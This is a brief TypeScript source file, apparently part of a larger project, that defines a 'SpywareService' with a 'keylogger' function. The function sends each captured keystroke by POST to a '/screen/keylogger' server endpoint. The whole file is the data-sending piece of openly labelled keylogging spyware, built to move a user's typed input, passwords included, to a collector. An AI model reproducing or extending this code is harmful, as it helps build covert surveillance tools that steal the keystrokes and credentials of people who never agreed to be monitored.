import {fetcher} from "@/tools/axios";

export const SpywareService = {
    keylogger: async (key: string): Promise<void> => {
        try {
            return fetcher({
                url: '/screen/keylogger',
                options: {
                    method: 'POST',
                    data: {
                        key: key,
                    }
                }
            });
        } catch (e) {
            console.error(e);
        }

    }
}